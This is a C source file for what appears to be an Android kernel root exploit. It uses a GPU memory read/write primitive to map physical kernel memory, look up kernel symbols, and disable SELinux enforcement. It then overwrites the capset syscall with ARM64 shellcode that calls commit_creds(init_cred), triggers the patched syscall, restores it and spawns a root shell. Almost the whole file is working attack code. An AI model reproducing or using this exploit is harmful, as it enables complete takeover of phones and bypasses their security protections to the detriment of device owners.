#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>



#define KALLSYMS_LOOKUP_INCLUDE
#include "kallsyms_lookup.h"

#include "cheese.h"

int main() {
    g_level1_dcache_size = tu_get_l1_dcache_size();
#if 1
    if (!getenv("CHEESE_SKIP_GPU")) {
        struct cheese_gpu_rw cheese = {};
        if (cheese_gpu_rw_setup(&cheese)) {
            fprintf(stderr, "can't get GPU r/w\n");
            return 1;
        }
    }
#endif
    // now check ksma...
    fprintf(stderr, "about to ksma...\n");
    void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
    uint64_t ksma_physical_base = 0x80000000;
    //sync_cache_from_gpu(ksma_mapping + 0x08000000, ksma_mapping + 0x08000000 + 0x1000);
    uint32_t* mytarget = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x38 /* kernel header magic: ARMd */;
    fprintf(stderr, "%p=%x\n", mytarget, *mytarget);
    uint64_t* kernel_size_ptr = ksma_mapping - ksma_physical_base + 0xa8000000 + 0x10 /* kernel header: size */;
    uint64_t kernel_size = *kernel_size_ptr;
    void* kernel_physical_base = ksma_mapping - ksma_physical_base + 0xa8000000;

    void* kernel_copy_buf = malloc(kernel_size);
    memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
    if (getenv("CHEESE_DUMP_KERNEL")) {
        FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
        fwrite(kernel_copy_buf, 1, kernel_size, f);
        fclose(f);
    }

    struct cheese_kallsyms_lookup kallsyms_lookup;
    if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
        return 1;
    }

    const bool force_manual_patchfinder = false;

    // TODO(zhuowei): this is dumped from vmlinux-to-elf/kallsyms-finder on my computer and is specific to 51052260106700520 - need to auto detect this
    uint64_t kernel_virtual_base = kallsyms_lookup.text_base;
    uint64_t kernel_selinux_state_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "selinux_state");
    if (force_manual_patchfinder || !kernel_selinux_state_addr) {
        kernel_selinux_state_addr = cheese_lookup_selinux_state(&kallsyms_lookup);
    }
    bool* kernel_selinux_state_enforcing_ptr = kernel_physical_base + (kernel_selinux_state_addr - kernel_virtual_base);
    fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
    *kernel_selinux_state_enforcing_ptr = false;
    fprintf(stderr, "set selinux enforcing ptr...\n");
    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + sizeof(bool));

    uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
    if (force_manual_patchfinder || !init_cred_addr) {
        init_cred_addr = cheese_lookup_init_cred(&kallsyms_lookup);
    }
    uint64_t commit_creds_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "commit_creds");

#define LO_DWORD(a) (a & 0xffffffff)
#define HI_DWORD(a) (a >> 32)

    // https://www.longterm.io/cve-2020-0423.html
    uint32_t shellcode[] = {
        // commit_creds(init_cred)
        0x58000040, // ldr x0, .+8
        0x14000003, // b   .+12
        LO_DWORD(init_cred_addr),
        HI_DWORD(init_cred_addr),
        0x58000041, // ldr x1, .+8
        0x14000003, // b   .+12
        LO_DWORD(commit_creds_addr),
        HI_DWORD(commit_creds_addr),
        0xA9BF7BFD, // stp x29, x30, [sp, #-0x10]!
        0xD63F0020, // blr x1
        0xA8C17BFD, // ldp x29, x30, [sp], #0x10

        0x2A1F03E0, // mov w0, wzr
        0xD65F03C0, // ret
    };

    uint64_t kernel___do_sys_capset_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "__do_sys_capset");
    char* kernel___do_sys_capset_ptr = kernel_physical_base + (kernel___do_sys_capset_addr - kernel_virtual_base);

    /* Saving sys_capset current code */
    uint8_t sys_capset[sizeof(shellcode)];
    fprintf(stderr, "save...\n");
    stupid_memcpy(sys_capset, kernel___do_sys_capset_ptr, sizeof(sys_capset));
    /* Patching sys_capset with our shellcode */
    fprintf(stderr, "patch...\n");
    stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));

    // https://developer.arm.com/documentation/101430/0102/Functional-description/L1-memory-system/About-the-L1-memory-system/L1-instruction-side-memory-system
    // "behaves as a PIPT cache" - flushing this will flush all copies sharing same physical memory
    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(shellcode));

    fprintf(stderr, "call...\n");
    /* Calling our patched version of sys_capset */
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wnonnull"
    int err = capset(NULL, NULL);
    fprintf(stderr, "called...\n");
    #pragma clang diagnostic pop
    if (err) {
        fprintf(stderr, "capset returned %d\n", err);
        return 1;
    }
    fprintf(stderr, "restore...\n");
    /* Restoring sys_capset */
    stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(sys_capset));
    fprintf(stderr, "restored...\n");
    if (getuid() != 0) {
        fprintf(stderr, "failed to get root - rerun?\n");
        return 1;
    }

    stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
    execl("/system/bin/sh", "sh", NULL);
    fprintf(stderr, "can't exec?\n");

    return 0;
}